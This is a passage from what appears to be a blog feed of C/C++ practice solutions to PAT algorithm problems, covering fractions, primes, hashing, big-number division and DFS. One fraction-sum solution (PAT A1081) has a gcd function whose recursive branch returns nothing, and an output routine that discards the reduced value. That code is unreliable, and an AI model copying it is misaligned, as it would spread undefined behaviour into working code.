result.up=-result.up;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> reduce(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(Fraction result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    result=reduce(result);</span><br><span class="line">    <span class="keyword">if</span>(result.up&lt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(result.down==<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,result.up);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">abs</span>(result.up)&gt;<span class="built_in">abs</span>(result.down))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld/%lld&quot;</span>,result.up/result.down,<span class="built_in">abs</span>(result.up)%result.down,result.down);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld/%lld&quot;</span>,result.up,result.down);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(result.up&lt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld/%lld %lld/%lld&quot;</span>,&amp;a.up,&amp;a.down,&amp;b.up,&amp;b.down);</span><br><span class="line">    output(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; + &quot;</span>);</span><br><span class="line">    output(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; = &quot;</span>);</span><br><span class="line">    output(add(a,b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    output(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; - &quot;</span>);</span><br><span class="line">    output(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; = &quot;</span>);</span><br><span class="line">    output(sub(a,b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    output(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; * &quot;</span>);</span><br><span class="line">    output(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; = &quot;</span>);</span><br><span class="line">    output(multiply(a,b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    output(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; / &quot;</span>);</span><br><span class="line">    output(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; = &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(b.up==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Inf&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> output(divide(a,b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1081</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fraction</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> up,down;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a,<span class="keyword">long</span> <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        gcd(b,a%b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">reduce</span><span class="params">(Fraction a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.up==<span class="number">0</span>) a.down=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=gcd(<span class="built_in">abs</span>(a.up),<span class="built_in">abs</span>(a.down));</span><br><span class="line">        a.up/=temp;</span><br><span class="line">        a.down/=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Fraction <span class="title">add</span><span class="params">(Fraction a,Fraction b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up=a.up*b.down+b.up*a.down;</span><br><span class="line">    result.down=a.down*b.down;</span><br><span class="line">    <span class="keyword">return</span> reduce(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(Fraction result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reduce(result);</span><br><span class="line">    <span class="keyword">if</span>(result.down==<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,result.up);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">abs</span>(result.up)&gt;result.down) <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld/%lld&quot;</span>,result.up/result.down,<span class="built_in">abs</span>(result.up)%result.down,result.down);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld/%lld&quot;</span>,result.up,result.down);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    Fraction sum,temp;</span><br><span class="line">    sum.up=<span class="number">0</span>;</span><br><span class="line">    sum.down=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld/%lld&quot;</span>,&amp;temp.up,&amp;temp.down);</span><br><span class="line">        sum=add(sum,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    output(sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-4-1"><a href="#5-4-1" class="headerlink" title="5.4"></a>5.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1015</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> sqr=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(<span class="number">1.0</span>*n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=sqr;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,radix;</span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">120</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)!=EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;radix);</span><br><span class="line">        <span class="keyword">if</span>(isPrime(n)==<span class="literal">false</span>) <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                temp[len++]=n%radix;</span><br><span class="line">                n/=radix;</span><br><span class="line">            &#125;<span class="keyword">while</span>(n!=<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">                n=n*radix+temp[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isPrime(n)==<span class="literal">true</span>) <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1007</span></span><br><span class="line"><span class="comment">int prime[100001];</span></span><br><span class="line"><span class="comment">bool p[100001]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">int pnum=0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void FindPrime()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    for(int i=2;i&lt;100001;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(p[i]==false)&#123;</span></span><br><span class="line"><span class="comment">            prime[pnum++]=i;</span></span><br><span class="line"><span class="comment">            for(int j=i*2;j&lt;100001;j+=i)&#123;</span></span><br><span class="line"><span class="comment">                p[j]=true;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    FindPrime();</span></span><br><span class="line"><span class="comment">    int pair=0;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;100001;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(prime[i]&gt;N) break;</span></span><br><span class="line"><span class="comment">        if(prime[i]-prime[i-1]==2)&#123;</span></span><br><span class="line"><span class="comment">            pair++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,pair);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1078</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> sqr=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(<span class="number">1.0</span>*n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=sqr;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">10001</span>;</span><br><span class="line"><span class="keyword">bool</span> HashTable[N]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msize,n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;msize,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(isPrime(msize)==<span class="literal">false</span>) msize++;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="keyword">int</span> pos=temp%msize;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[pos]==<span class="literal">false</span>)&#123;</span><br><span class="line">            HashTable[pos]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,pos);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,pos);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> step;</span><br><span class="line">            <span class="keyword">for</span>(step=<span class="number">1</span>;step&lt;msize;step++)&#123;</span><br><span class="line">                pos=(temp+step*step)%msize;</span><br><span class="line">                <span class="keyword">if</span>(HashTable[pos]==<span class="literal">false</span>)&#123;</span><br><span class="line">                    HashTable[pos]=<span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,pos);</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,pos);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(step&gt;=msize)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-6"><a href="#5-6" class="headerlink" title="5.6"></a>5.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1017</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bign</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> d[<span class="number">1010</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    bign() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="keyword">sizeof</span>(d));</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">bign <span class="title">change</span><span class="params">(<span class="keyword">char</span> str[])</span> </span>&#123; <span class="comment">// 将整数转换为bign</span></span><br><span class="line">    bign a;</span><br><span class="line">    a.len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.len; i++) &#123;</span><br><span class="line">        a.d[i] = str[i] - <span class="string">&#x27;0&#x27;</span>; <span class="comment">// 高位放进a的低位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">divide</span><span class="params">(bign a, <span class="keyword">int</span> b, <span class="keyword">int</span>&amp; r)</span> </span>&#123; <span class="comment">//高精度除法，r为余数</span></span><br><span class="line">    bign c;</span><br><span class="line">    c.len = a.len;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.len; i++) &#123; <span class="comment">//从高位开始</span></span><br><span class="line">        r = r * <span class="number">10</span> + a.d[i]; <span class="comment">//和上一位遗留的余数组合</span></span><br><span class="line">        <span class="keyword">if</span>( r &lt; b ) c.d[i] = <span class="number">0</span>; <span class="comment">//不够除，该位为0</span></span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">//够除</span></span><br><span class="line">            c.d[i] = r / b; <span class="comment">//商</span></span><br><span class="line">            r = r % b; <span class="comment">//获得新的余数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; c.len - <span class="number">1</span> &amp;&amp; c.d[i] == <span class="number">0</span>; i++) &#123;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历输出</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = j; i &lt; c.len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, c.d[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">1010</span>];</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, str, &amp;b);</span><br><span class="line">    bign a = change(str); <span class="comment">//将a转换为bign型</span></span><br><span class="line">    divide(a, b, r);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//和上面一题差不多，懒得做了，转载自https://blog.csdn.net/linghugoolge/article/details/82825757</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//read</span></span><br><span class="line">	<span class="built_in">string</span> s, t=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; s ;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//solve the original number</span></span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); ++i) </span><br><span class="line">		a[s[i] - <span class="string">&#x27;0&#x27;</span>] ++ ;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//double the number</span></span><br><span class="line">	reverse(s.begin(), s.end());</span><br><span class="line">	<span class="keyword">int</span> jin = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); ++i) &#123;</span><br><span class="line">		<span class="keyword">int</span> b = jin + <span class="number">2</span>*(s[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		t += (<span class="keyword">char</span>)(b % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		jin = b / <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (jin != <span class="number">0</span>)</span><br><span class="line">		t += (<span class="keyword">char</span>)(jin + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	reverse(t.begin(), t.end());</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//solve the second number</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.length(); ++i) </span><br><span class="line">		a[t[i] - <span class="string">&#x27;0&#x27;</span>]--;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//result</span></span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] != <span class="number">0</span>) &#123;</span><br><span class="line">			flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">true</span>)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; t &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第八章</title>
    <url>/2020/02/13/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%85%AB%E7%AB%A0/</url>
    <content><![CDATA[<p>第八章上机训练</p>
<span id="more"></span>

<h2 id="8-上机"><a href="#8-上机" class="headerlink" title="8(上机)"></a>8(上机)</h2><h3 id="8-1"><a href="#8-1" class="headerlink" title="8.1"></a>8.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1103</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; K,ans,temp;</span><br><span class="line"><span class="keyword">int</span> n,k,p,maxsum=<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> nowk,<span class="keyword">int</span> sum,<span class="keyword">int</span> Ksum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sum==n&amp;&amp;nowk==k)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Ksum&gt;maxsum)&#123;</span><br><span class="line">            ans=temp;</span><br><span class="line">            maxsum=Ksum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum&gt;n||nowk&gt;k) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(index<span class="number">-1</span>&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        temp.push_back(index);</span><br><span class="line">        DFS(index,nowk+<span class="number">1</span>,sum+K[index],Ksum+index);</span><br><span class="line">        temp.pop_back();</span><br><span class="line">        DFS(index<span 